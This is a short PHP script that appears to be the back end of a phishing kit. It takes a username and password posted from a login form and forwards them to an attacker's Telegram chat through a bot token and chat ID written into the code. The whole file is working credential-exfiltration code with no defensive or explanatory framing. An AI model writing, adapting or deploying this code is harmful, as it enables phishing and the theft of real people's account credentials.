<?php
// Replace these with your provided values
$botToken = "7649753693:AAFrENLvq8qeHpfPSWiqaB10acgUGR3wGNs";
$chatId = "7479124922";

// Get form data from the JSON payload
$data = json_decode(file_get_contents('php://input'), true);

$username = htmlspecialchars($data['username']);
$password = htmlspecialchars($data['password']);

// Compose the message
$message = "New Login:\nUsername: $username\nPassword: $password";

// Send the message to Telegram
$url = "https://api.telegram.org/bot$botToken/sendMessage";
$postData = [
    'chat_id' => $chatId,
    'text' => $message,
];

$options = [
    'http' => [
        'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
        'method'  => 'POST',
        'content' => http_build_query($postData),
    ],
];

$context = stream_context_create($options);
$result = file_get_contents($url, false, $context);

if ($result === FALSE) {
    http_response_code(500);
    echo json_encode(['status' => 'error', 'message' => 'Failed to send message']);
} else {
    echo json_encode(['status' => 'success', 'message' => 'Message sent to Telegram']);
}
?>

